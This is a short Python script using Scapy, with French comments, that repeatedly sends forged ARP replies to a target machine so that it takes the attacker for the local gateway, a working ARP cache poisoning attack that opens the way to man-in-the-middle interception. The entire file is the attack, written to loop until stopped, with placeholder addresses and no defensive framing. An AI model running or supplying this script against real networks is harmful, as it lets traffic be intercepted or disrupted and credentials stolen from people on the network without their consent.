from scapy.all import *
import time

def arp_poison(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

if __name__ == "__main__":
    target_ip = "192.168.1.5"  # IP de la cible
    target_mac = "00:11:22:33:44:55"  # MAC de la cible
    spoof_ip = "192.168.1.1"  # IP à usurper (par exemple, la passerelle)

    try:
        while True:
            arp_poison(target_ip, target_mac, spoof_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nArrêt de l'attaque.")
